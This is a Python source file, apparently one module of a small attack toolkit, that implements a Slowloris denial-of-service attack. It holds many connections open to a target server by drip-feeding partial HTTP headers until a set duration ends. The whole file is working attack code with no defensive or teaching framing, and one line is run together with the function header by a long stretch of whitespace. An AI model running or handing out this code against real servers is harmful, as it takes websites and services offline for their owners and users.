import socket
import time
import threading
from utils.colors import color

# By Rayzer
def slowloris_attack(ip, port, duration, threads=100):                                                                                              end_time = time.time() + duration
    sockets = []

    print(color(f"[*] Starting Slowloris on {ip}:{port} | Threads: {threads}", "blue"))

    def setup_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(f"GET /?{time.time()} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {ip}\r\n".encode("utf-8"))
            s.send("User-Agent: slowloris\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            return s
        except:
            return None

    for _ in range(threads):
        sock = setup_socket()
        if sock:
            sockets.append(sock)

    while time.time() < end_time:
        for sock in sockets:
            try:
                sock.send(f"X-a: {time.time()}\r\n".encode("utf-8"))
            except:
                sockets.remove(sock)
                new_sock = setup_socket()
                if new_sock:
                    sockets.append(new_sock)
        time.sleep(5)

    for sock in sockets:
        try:
            sock.close()
        except:
            pass

    print(color(f"[+] Slowloris attack complete. Total open sockets: {len(sockets)}", "green"))


